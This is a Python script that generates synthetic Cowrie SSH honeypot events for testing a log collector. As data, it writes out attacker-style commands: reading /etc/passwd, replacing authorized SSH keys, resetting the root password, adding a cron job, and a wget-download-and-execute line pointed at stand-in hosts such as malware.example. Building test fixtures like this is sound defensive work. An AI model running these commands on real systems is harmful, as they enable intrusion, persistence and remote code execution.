"""Generate synthetic Cowrie-style JSON events for development and tests.

Usage:
    python -m collector.synthetic --sessions 200 --seed 7 --out sample-data/synthetic-cowrie.json

Safety rules for synthetic data:
- Source IPs come only from the RFC 5737 documentation ranges.
- URLs use only reserved example domains (RFC 2606) and documentation IPs.
- SSH keys are obviously fake placeholders.
So this file can be committed and shown publicly without leaking anything.
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import random
from collections.abc import Iterator
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

DOC_NETWORKS = [
    ipaddress.ip_network("192.0.2.0/24"),
    ipaddress.ip_network("198.51.100.0/24"),
    ipaddress.ip_network("203.0.113.0/24"),
]
SENSOR_NAME = "lab-sensor"
SENSOR_IP = "10.0.0.5"

CLIENT_VERSIONS = [
    "SSH-2.0-Go",
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-OpenSSH_8.9p1",
    "SSH-2.0-paramiko_3.4.0",
    "SSH-2.0-PuTTY_Release_0.80",
]
USERNAMES = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres", "pi", "git"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "1234", "ubuntu",
             "raspberry", "P@ssw0rd", "admin123", "test"]

RECON_COMMANDS = [
    "uname -a",
    "whoami",
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem",
    "ls -lh $(which ls)",
    "crontab -l",
    "w",
    "uname -m",
    "cat /etc/passwd",
    "ifconfig",
    "lscpu | grep Model",
    "df -h | head -n 2",
]
PERSISTENCE_COMMANDS = [
    "cd ~; chattr -ia .ssh; lockr -ia .ssh",
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA-SYNTHETIC-KEY-NOT-REAL synthetic@example" >> .ssh/authorized_keys && chmod -R go= ~/.ssh',
    'echo "root:SyntheticPass1"|chpasswd|bash',
]
DOWNLOAD_HOSTS = ["malware.example", "payload.example.net", "203.0.113.200", "198.51.100.77"]
CRON_COMMANDS = ['(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.x/run.sh") | crontab -']

BEHAVIOURS = ["scan", "bruteforce", "recon", "persistence", "downloader"]
WEIGHTS = [25, 40, 15, 12, 8]


class _SessionWriter:
    def __init__(self, rng: random.Random, start: datetime) -> None:
        self.rng = rng
        self.now = start
        self.session = f"{rng.getrandbits(48):012x}"
        net = rng.choice(DOC_NETWORKS)
        self.src_ip = str(net[rng.randrange(1, net.num_addresses - 1)])
        self.src_port = rng.randrange(1024, 65535)
        self.started = start

    def event(self, eventid: str, **fields: Any) -> dict[str, Any]:
        # Same base fields Cowrie 3.x puts on every event.
        self.now += timedelta(milliseconds=self.rng.randrange(50, 4000))
        return {
            "eventid": eventid,
            "timestamp": self.now.isoformat().replace("+00:00", "Z"),
            "session": self.session,
            "protocol": "ssh",
            "src_ip": self.src_ip,
            "src_port": self.src_port,
            "dst_ip": SENSOR_IP,
            "dst_port": 2222,
            "sensor": SENSOR_NAME,
            **fields,
        }


def _session(rng: random.Random, start: datetime) -> list[dict[str, Any]]:
    w = _SessionWriter(rng, start)
    behaviour = rng.choices(BEHAVIOURS, WEIGHTS)[0]
    events = [
        w.event("cowrie.session.connect"),
        w.event("cowrie.client.version", version=rng.choice(CLIENT_VERSIONS)),
    ]

    if behaviour != "scan":
        attempts = rng.randrange(1, 8) if behaviour == "bruteforce" else rng.randrange(0, 3)
        for _ in range(attempts):
            events.append(w.event("cowrie.login.failed", username=rng.choice(USERNAMES),
                                  password=rng.choice(PASSWORDS)))
        if behaviour != "bruteforce":
            events.append(w.event("cowrie.login.success", username="root",
                                  password=rng.choice(PASSWORDS)))
            commands = rng.sample(RECON_COMMANDS, rng.randrange(2, 6))
            if behaviour == "persistence":
                commands += PERSISTENCE_COMMANDS[: rng.randrange(1, 4)]
                if rng.random() < 0.3:
                    commands += CRON_COMMANDS
            for cmd in commands:
                events.append(w.event("cowrie.command.input", input=cmd))
            if behaviour == "downloader":
                url = f"http://{rng.choice(DOWNLOAD_HOSTS)}/{rng.choice(['x86', 'bins.sh', 'a.sh'])}"
                events.append(w.event("cowrie.command.input",
                                      input=f"cd /tmp; wget {url}; chmod +x *; ./{url.rsplit('/', 1)[1]}"))
                # Egress is blocked on the sensor, so downloads always fail.
                events.append(w.event("cowrie.session.file_download.failed", url=url))

    duration_ms = int((w.now - w.started).total_seconds() * 1000) + 500
    events.append(w.event("cowrie.session.closed", duration_ms=duration_ms))
    return events


def generate(sessions: int, seed: int, start: datetime, duplicate_rate: float = 0.0,
             mean_gap_s: int = 300) -> Iterator[dict[str, Any]]:
    """Yield events session by session. duplicate_rate re-emits some events
    verbatim, to exercise deduplication. mean_gap_s spaces sessions out."""
    rng = random.Random(seed)
    # Separate RNG so turning duplicates on doesn't change the events themselves.
    dup_rng = random.Random(f"{seed}-dup")
    t = start
    for _ in range(sessions):
        t += timedelta(seconds=rng.randrange(5, 2 * mean_gap_s))
        for ev in _session(rng, t):
            yield ev
            if duplicate_rate and dup_rng.random() < duplicate_rate:
                yield dict(ev)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--sessions", type=int, default=200)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--start", default="2026-01-01T00:00:00+00:00")
    ap.add_argument("--duplicate-rate", type=float, default=0.0)
    ap.add_argument("--mean-gap-s", type=int, default=300, help="average seconds between sessions")
    ap.add_argument("--out", type=Path, required=True)
    args = ap.parse_args(argv)

    start = datetime.fromisoformat(args.start).astimezone(timezone.utc)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    count = 0
    with args.out.open("w", encoding="utf-8", newline="\n") as fh:
        for ev in generate(args.sessions, args.seed, start, args.duplicate_rate, args.mean_gap_s):
            fh.write(json.dumps(ev) + "\n")
            count += 1
    print(f"wrote {count} events to {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
